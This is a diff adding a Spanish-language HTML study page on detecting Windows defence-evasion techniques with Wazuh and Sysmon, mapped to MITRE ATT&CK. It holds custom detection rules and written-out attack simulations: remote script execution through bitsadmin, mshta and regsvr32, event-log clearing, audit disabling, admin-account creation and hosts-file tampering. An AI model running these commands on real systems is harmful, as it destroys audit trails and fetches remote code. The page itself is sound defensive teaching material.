@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Detección de Técnicas de Evasión de Defensas en Windows con Wazuh</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      line-height: 1.6;
+      color: #333;
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+    h1, h2, h3 {
+      color: #1a5276;
+    }
+    h1 {
+      border-bottom: 2px solid #1a5276;
+      padding-bottom: 10px;
+    }
+    h2 {
+      border-bottom: 1px dashed #aaa;
+      padding-bottom: 5px;
+      margin-top: 30px;
+    }
+    code {
+      background-color: #f4f4f4;
+      border: 1px solid #ddd;
+      padding: 2px 6px;
+      border-radius: 3px;
+      font-family: monospace;
+    }
+    pre {
+      background-color: #f4f4f4;
+      border: 1px solid #ddd;
+      padding: 10px;
+      border-radius: 5px;
+      overflow-x: auto;
+    }
+    .alert {
+      background-color: #f8d7da;
+      border: 1px solid #f5c6cb;
+      color: #721c24;
+      padding: 10px;
+      border-radius: 5px;
+      margin: 15px 0;
+    }
+    .reference {
+      font-size: 0.9em;
+      color: #555;
+      font-style: italic;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Detección de Técnicas de Evasión de Defensas en Entornos Windows mediante Wazuh</h1>
+
+  <p><strong>Resumen:</strong> Las técnicas de evasión de defensas son métodos utilizados por actores maliciosos para ocultar su presencia, desactivar mecanismos de seguridad y operar sin ser detectados en sistemas comprometidos. Este artículo explora cómo la plataforma de seguridad Wazuh puede detectar estas técnicas en endpoints Windows, utilizando el marco MITRE ATT&CK como referencia. Se describe una infraestructura de prueba, la configuración de Sysmon para una mejor visibilidad del sistema, y la implementación de reglas personalizadas y nativas para identificar comportamientos sospechosos. A través de simulaciones controladas, se demuestra la efectividad de Wazuh en la detección de actividades de evasión comúnmente empleadas por adversarios.</p>
+
+  <h2>1. Introducción</h2>
+
+  <p>La evasión de defensas es una táctica fundamental en el ciclo de ataque de los ciberdelincuentes. Al deshabilitar herramientas de seguridad, manipular registros del sistema o abusar de procesos legítimos, los atacantes logran mantener acceso persistente y operar de forma encubierta. Este artículo analiza cómo <strong>Wazuh</strong>, una solución de seguridad de código abierto, puede detectar estas técnicas en entornos Windows mediante la integración con <strong>Sysmon</strong> y el uso de reglas de detección alineadas con el marco <strong><a href="copias-seguridad/mitre-attack.html" target="_blank">MITRE ATT&CK</a></strong>.</p>
+
+  <h2>2. Infraestructura de Prueba</h2>
+
+  <p>La investigación se realizó en un entorno controlado compuesto por:</p>
+  <ul>
+    <li><strong>Wazuh OVA 4.12.0</strong>: Máquina virtual preconfigurada que incluye el servidor Wazuh, el indexador y el dashboard.</li>
+    <li><strong>Endpoint Windows 11</strong>: Con el agente Wazuh instalado y registrado en el servidor central.</li>
+  </ul>
+
+  <h2>3. Configuración de Sysmon</h2>
+
+  <p>Para mejorar la visibilidad del endpoint, se configuró <strong>Sysmon (System Monitor)</strong>, una herramienta de Microsoft que registra eventos detallados del sistema. Los pasos fueron:</p>
+
+  <ol>
+    <li>Descargar e instalar Sysmon desde <a href="https://learn.microsoft.com/sysinternals" target="_blank">Microsoft Sysinternals</a>.</li>
+    <li>Descargar el archivo de configuración recomendado por Wazuh:</li>
+  </ol>
+
+  <pre>wget -Uri https://wazuh.com/resources/blog/emulation-of-attack-techniques-and-detection-with-wazuh/sysmonconfig.xml -OutFile C:\Sysmon\sysmonconfig.xml</pre>
+
+  <ol start="3">
+    <li>Instalar Sysmon con el perfil personalizado:</li>
+  </ol>
+
+  <pre>.\Sysmon64.exe -accepteula -i sysmonconfig.xml</pre>
+
+  <ol start="4">
+    <li>Configurar el agente Wazuh para recopilar eventos de Sysmon editando <code>ossec.conf</code>:</li>
+  </ol>
+
+  <pre>&lt;localfile&gt;
+  &lt;location&gt;Microsoft-Windows-Sysmon/Operational&lt;/location&gt;
+  &lt;log_format&gt;eventchannel&lt;/log_format&gt;
+&lt;/localfile&gt;</pre>
+
+  <ol start="5">
+    <li>Reiniciar el servicio del agente:</li>
+  </ol>
+
+  <pre>Restart-Service -Name wazuh</pre>
+
+  <h2>4. Técnicas de Evasión de Defensas y su Detección</h2>
+
+  <p>Se simularon técnicas del marco MITRE ATT&CK. A continuación se detallan las más relevantes.</p>
+
+  <h3>T1197 – BITS Jobs</h3>
+
+  <p><strong>Descripción:</strong> Uso del servicio BITS para descargar y ejecutar código malicioso en segundo plano.</p>
+
+  <p><strong>Detección:</strong> Regla personalizada que detecta comandos con <code>/transfer</code>, <code>/download</code> o <code>/priority</code>.</p>
+
+  <pre>&lt;rule id="110001" level="5"&gt;
+  &lt;if_sid&gt;61603&lt;/if_sid&gt;
+  &lt;field name="win.eventdata.commandLine" type="pcre2"&gt;(bitsadmin)(?=.*(/transfer|/download|/priority))&lt;/field&gt;
+  &lt;description&gt;Suspicious download and execution with BITS job&lt;/description&gt;
+  &lt;mitre&gt;&lt;id&gt;T1197&lt;/id&gt;&lt;/mitre&gt;
+&lt;/rule&gt;</pre>
+
+  <p><strong>Simulación:</strong></p>
+  <pre>bitsadmin.exe /transfer /Download /priority Foreground https://.../T1197.md %temp%\bitsdownload.txt</pre>
+
+  <div class="alert">Resultado: Alerta generada con <code>rule.id: 110001</code> en el dashboard de Wazuh.</div>
+
+  <h3>T1562.002 – Deshabilitar el Registro de Eventos</h3>
+
+  <p><strong>Descripción:</strong> Desactivación de la auditoría de eventos para evitar la detección.</p>
+
+  <p><strong>Detección:</strong> Regla nativa <code>60112</code> de Wazuh.</p>
+
+  <p><strong>Simulación:</strong></p>
+  <pre>auditpol /set /category:"Account Logon" /success:disable /failure:disable</pre>
+
+  <div class="alert">Resultado: Alerta generada con <code>rule.id: 60112</code>.</div>
+
+  <h3>T1070.001 – Limpieza de Registros de Eventos</h3>
+
+  <p><strong>Descripción:</strong> Eliminación de registros del sistema para ocultar rastros de actividad maliciosa.</p>
+
+  <p><strong>Detección:</strong> Reglas nativas <code>63103</code> (Security log) y <code>63104</code> (otros logs).</p>
+
+  <p><strong>Simulación:</strong></p>
+  <pre>wevtutil cl System; wevtutil cl Security</pre>
+
+  <div class="alert">Resultado: Alertas generadas con <code>rule.id: 63103</code> y <code>63104</code>.</div>
+
+  <h3>T1070.009 – Eliminación de Persistencia</h3>
+
+  <p><strong>Descripción:</strong> Eliminación de cuentas de usuario o servicios usados para mantener acceso.</p>
+
+  <p><strong>Detección:</strong> Reglas nativas para cambios en cuentas locales (ej. <code>60109</code>, <code>60110</code>, <code>60154</code>).</p>
+
+  <p><strong>Simulación:</strong></p>
+  <pre>New-LocalUser -Name "T1070" -NoPassword
+Add-LocalGroupMember -Group "Administrators" -Member "T1070"
+Remove-LocalUser -Name "T1070"</pre>
+
+  <div class="alert">Resultado: Alertas por creación y eliminación de usuario.</div>
+
+  <h3>T1218.005 – Ejecución mediante Mshta</h3>
+
+  <p><strong>Descripción:</strong> Abuso de <code>mshta.exe</code> para ejecutar scripts remotos (HTA).</p>
+
+  <p><strong>Detección:</strong> Regla personalizada que detecta scripts con <code>exec</code> o <code>close</code>.</p>
+
+  <pre>&lt;rule id="110002" level="5"&gt;
+  &lt;if_sid&gt;61603&lt;/if_sid&gt;
+  &lt;field name="win.eventdata.commandLine" type="pcre2"&gt;(mshta)(?=.*(exec|close))&lt;/field&gt;
+  &lt;description&gt;Suspicious execution of a remote script with MSHTA&lt;/description&gt;
+  &lt;mitre&gt;&lt;id&gt;T1218.005&lt;/id&gt;&lt;/mitre&gt;
+&lt;/rule&gt;</pre>
+
+  <p><strong>Simulación:</strong></p>
+  <pre>mshta.exe javascript:a=(GetObject('script:https://.../mshta.sct')).Exec();close();</pre>
+
+  <div class="alert">Resultado: Alerta con <code>rule.id: 110002</code>.</div>
+
+  <h3>T1218.010 – Ejecución mediante Regsvr32</h3>
+
+  <p><strong>Descripción:</strong> Uso de <code>regsvr32.exe</code> para cargar scripts COM maliciosos desde una URL remota.</p>
+
+  <p><strong>Detección:</strong> Regla personalizada que detecta parámetros como <code>/i</code>, <code>/s</code>, <code>/u</code> o <code>scrobj</code>.</p>
+
+  <pre>&lt;rule id="110003" level="5"&gt;
+  &lt;if_sid&gt;61603&lt;/if_sid&gt;
+  &lt;field name="win.eventdata.commandLine" type="pcre2"&gt;(regsvr32)(?=.*(/s|/u|/i|scrobj))&lt;/field&gt;
+  &lt;description&gt;Suspicious remote code execution with Regsvr32&lt;/description&gt;
+  &lt;mitre&gt;&lt;id&gt;T1218.010&lt;/id&gt;&lt;/mitre&gt;
+&lt;/rule&gt;</pre>
+
+  <p><strong>Simulación:</strong></p>
+  <pre>regsvr32.exe /s /u /i:https://.../RegSvr32.sct scrobj.dll</pre>
+
+  <div class="alert">Resultado: Alerta con <code>rule.id: 110003</code>.</div>
+
+  <h3>T1014 – Rootkit</h3>
+
+  <p><strong>Descripción:</strong> Modificación del archivo <code>hosts</code> para bloquear actualizaciones de seguridad.</p>
+
+  <p><strong>Detección:</strong> Módulo <strong>Rootcheck</strong> de Wazuh, que escanea archivos críticos.</p>
+
+  <p><strong>Simulación:</strong></p>
+  <pre>Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "127.0.0.1 microsoft.com"</pre>
+
+  <p>Reiniciar el agente para activar el escaneo:</p>
+  <pre>Restart-Service -Name wazuh</pre>
+
+  <div class="alert">Resultado: Alerta con <code>rule.id: 513</code> al detectar modificación sospechosa.</div>
+
+  <h2>5. Discusión</h2>
+
+  <p>Los resultados muestran que Wazuh, combinado con Sysmon, proporciona una capa robusta de detección contra técnicas de evasión. Las reglas personalizadas permiten adaptar la detección a comportamientos específicos, mientras que las reglas nativas cubren eventos comunes.</p>
+
+  <p>Limitaciones observadas:</p>
+  <ul>
+    <li>Requiere mantenimiento de reglas personalizadas.</li>
+    <li>Puede generar falsos positivos si herramientas legítimas usan comandos similares.</li>
+    <li>El escaneo de Rootcheck tiene un intervalo predeterminado de 12 horas.</li>
+  </ul>
+
+  <h2>6. Conclusiones</h2>
+
+  <p>Este estudio demuestra que <strong>Wazuh es efectivo para detectar técnicas de evasión de defensas en entornos Windows</strong>. La combinación de Sysmon, reglas nativas y personalizadas, y el módulo Rootcheck permite identificar actividades maliciosas que de otro modo pasarían desapercibidas.</p>
+
+  <p><strong>Recomendaciones:</strong></p>
+  <ul>
+    <li>Monitorear eventos de creación de procesos y modificaciones del sistema.</li>
+    <li>Actualizar periódicamente las reglas de detección.</li>
+    <li>Realizar simulaciones de ataques (red teaming) para validar las capacidades de detección.</li>
+    <li>Integrar Wazuh con otros sistemas SIEM o EDR para una respuesta más completa.</li>
+  </ul>
+
+  <h2 class="reference">Referencias</h2>
+  <p class="reference">
+    - MITRE ATT&CK Framework: <a href="https://attack.mitre.org" target="_blank">https://attack.mitre.org</a><br>
+    - Documentación de Wazuh: <a href="https://documentation.wazuh.com" target="_blank">https://documentation.wazuh.com</a><br>
+    - Artículo original: <a href="https://ow.ly/btaA50WM1LX" target="_blank">https://ow.ly/btaA50WM1LX</a>
+  </p>
+
+  <footer style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #ddd; text-align: center;">
+    <p><a href="apuntes.html">← Volver a Apuntes</a></p>
+  </footer>
+
+</body>
+</html>
